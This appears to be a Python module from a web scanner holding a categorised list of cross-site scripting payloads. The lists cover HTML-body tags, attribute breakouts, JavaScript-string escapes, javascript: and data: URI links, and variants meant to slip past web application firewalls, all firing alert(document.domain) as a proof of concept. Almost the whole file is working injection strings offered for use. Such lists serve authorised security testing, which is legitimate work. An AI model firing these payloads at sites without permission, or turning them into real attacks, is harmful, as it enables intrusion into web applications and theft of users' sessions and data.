"""
Proven-working XSS payload database.

Categories:
  html_body, attribute_breakout, js_context, href_context, waf_bypass
"""

from __future__ import annotations

from typing import Iterable


def _alert(marker: str) -> str:
    # Stable PoC — domain is enough for professional reports
    return "alert(document.domain)"


def build_payloads(marker: str = "xomlsx") -> dict[str, list[str]]:
    """Return categorized payload lists (100–150 total unique bases)."""
    a = _alert(marker)

    html_body = [
        f"<script>{a}</script>",
        f"<script type=\"text/javascript\">{a}</script>",
        f"<img src=x onerror={a}>",
        f"<img src=\"x\" onerror={a}>",
        f"<img src=x onerror={a} />",
        f"<svg onload={a}>",
        f"<svg/onload={a}>",
        f"<svg onload={a}></svg>",
        f"<body onload={a}>",
        f"<body onpageshow={a}>",
        f"<input autofocus onfocus={a}>",
        f"<select autofocus onfocus={a}><option>x</option></select>",
        f"<textarea autofocus onfocus={a}>x</textarea>",
        f"<details open ontoggle={a}>x</details>",
        f"<marquee onstart={a}>x</marquee>",
        f"<video src=x onerror={a}>",
        f"<audio src=x onerror={a}>",
        f"<iframe srcdoc=\"<script>{a}</script>\">",
        f"<div onmouseover={a}>x</div>",
        f"<div onclick={a}>x</div>",
        f"<div onpointerdown={a}>x</div>",
        f"<img src=1 onerror={a}>",
        f"<img src=x onload={a}>",
        f"<svg><script>{a}</script></svg>",
        f"<svg><animate onbegin={a} attributeName=x dur=1s>",
        f"<math><mtext><table><mglyph><style><!--</style><img src=x onerror={a}>",
        f"<frameset onload={a}>",
        f"<object data=\"javascript:{a}\">",
        f"<embed src=\"javascript:{a}\">",
        f"<body/onload={a}>",
        f"<img/src=x onerror={a}>",
        f"<svg onload={a} >",
        f"<img src=x onerror={a} >",
    ]

    attribute_breakout = [
        f"\"><img src=x onerror={a}>",
        f"'><img src=x onerror={a}>",
        f"\"><svg/onload={a}>",
        f"'><svg/onload={a}>",
        f"\"><script>{a}</script>",
        f"'><script>{a}</script>",
        f"\" autofocus onfocus={a} x=\"",
        f"' autofocus onfocus={a} x='",
        f"\" onmouseover={a} x=\"",
        f"' onmouseover={a} x='",
        f"\" onpointerover={a} x=\"",
        f"' onfocus={a} autofocus='",
        f"\"><body onload={a}>",
        f"'><body onload={a}>",
        f"\"><details open ontoggle={a}>",
        f"'><details open ontoggle={a}>",
        f"\" onfocus={a} autofocus tabindex=1 x=\"",
        f"' onfocus={a} autofocus tabindex=1 x='",
        f"\"><img src=x onerror={a}//",
        f"'><img src=x onerror={a}//",
        f"\"><svg onload={a}>",
        f"'><svg onload={a}>",
        f"\"><iframe srcdoc=\"<script>{a}</script>\">",
        f"\" accesskey=x onclick={a} x=\"",
        f"\"><div onmouseover={a}>x</div>",
    ]

    js_context = [
        f"';{a}//",
        f"'-{a}-'",
        f"\";{a}//",
        f"';{a};//",
        f"</script><script>{a}</script>",
        f"</script><img src=x onerror={a}>",
        f"\\';{a}//",
        f"`-{a}-`",
        f"</script><svg/onload={a}>",
        f"'-alert(document.domain)-'",
        f"\";alert(document.domain)//",
        f"</script><body onload={a}>",
        f"'||{a}||'",
        f"\"||{a}||\"",
        f"';{a};var x='",
        f"';{a};//",
        f"'-{a}-'//",
        f"</script><script>//{a}",
        f"';{a}</script>",
        f"',{a},'",
        f"\",{a},\"",
        f"</title><script>{a}</script>",
        f"</textarea><script>{a}</script>",
        f"</style><script>{a}</script>",
    ]

    href_context = [
        f"javascript:{a}",
        f"javascript:{a}//",
        f"javascript:{a};",
        f"data:text/html,<script>{a}</script>",
        f"data:text/html;charset=utf-8,<script>{a}</script>",
        f"<a href=\"javascript:{a}\">x</a>",
        f"<form action=\"javascript:{a}\"><input type=submit></form>",
        f"<button formaction=\"javascript:{a}\">x</button>",
        f"<iframe src=\"javascript:{a}\">",
        f"JaVaScRiPt:{a}",
        f"javascript&colon;{a}",
        f"javascript:/*--></title></style></textarea></script></xmp><svg/onload={a}>",
        f"<a href=javascript:{a}>x</a>",
        f"<a href=\"data:text/html,<script>{a}</script>\">x</a>",
        f"vbscript:msgbox(1)",  # legacy, often filtered; kept as low-priority probe
    ]

    # Low-noise WAF-oriented variants (no unicode / null / hex-entity spam)
    waf_bypass = [
        f"<scr<script>ipt>{a}</script>",
        f"<img src=x oneonerrorrror={a}>",
        f"<svg on onload={a}>",
        f"<svg onload={a}//",
        f"<img src=x onerror={a} onerror={a}>",
        f"<body onload={a}//",
        f"<svg/onload={a}//",
        f"<img src=x onerror={a} >",
        f"<svg onload={a} >",
        f"<img src=x onerror={a}/\n>",
        f"<svg\nonload={a}>",
        f"<img\nsrc=x\nonerror={a}>",
        f"<details/open/ontoggle={a}>",
        f"<svg><script>{a}//</script>",
        f"<img src=x onerror={a}	>",
        f"<script>{a}</script	>",
        f"<script\t>{a}</script>",
        f"<img src=x onerror=\n{a}>",
        f"<svg onload=\n{a}>",
        f"<img/src=\"x\"/onerror={a}>",
        f"<svg/onload={a}/",
        f"<img src=x onerror={a}//-",
        f"<script>{a};</script>",
        f"<img src=x onerror='{a}'>",
        f"<img src=x onerror=\"{a}\">",
        f"<svg onload=\"{a}\">",
        f"<input autofocus onfocus=\"{a}\">",
        f"<body onload=\"{a}\">",
        f"<details open ontoggle=\"{a}\">",
        f"<iframe srcdoc='<script>{a}</script>'>",
    ]

    return {
        "html_body": html_body,
        "attribute_breakout": attribute_breakout,
        "js_context": js_context,
        "href_context": href_context,
        "waf_bypass": waf_bypass,
    }


def all_payloads(
    marker: str = "xomlsx",
    categories: Iterable[str] | None = None,
) -> list[tuple[str, str]]:
    """
    Flatten payload DB to (category, payload) pairs.
    If categories is set, only those categories are included.
    """
    db = build_payloads(marker)
    if categories:
        wanted = {c.strip().lower() for c in categories}
        items: list[tuple[str, str]] = []
        for cat, plist in db.items():
            if cat in wanted:
                for p in plist:
                    items.append((cat, p))
        return items

    items = []
    for cat, plist in db.items():
        for p in plist:
            items.append((cat, p))
    return items


def payload_stats(marker: str = "xomlsx") -> dict[str, int]:
    db = build_payloads(marker)
    stats = {k: len(v) for k, v in db.items()}
    stats["total"] = sum(stats.values())
    return stats


CATEGORIES = (
    "html_body",
    "attribute_breakout",
    "js_context",
    "href_context",
    "waf_bypass",
)
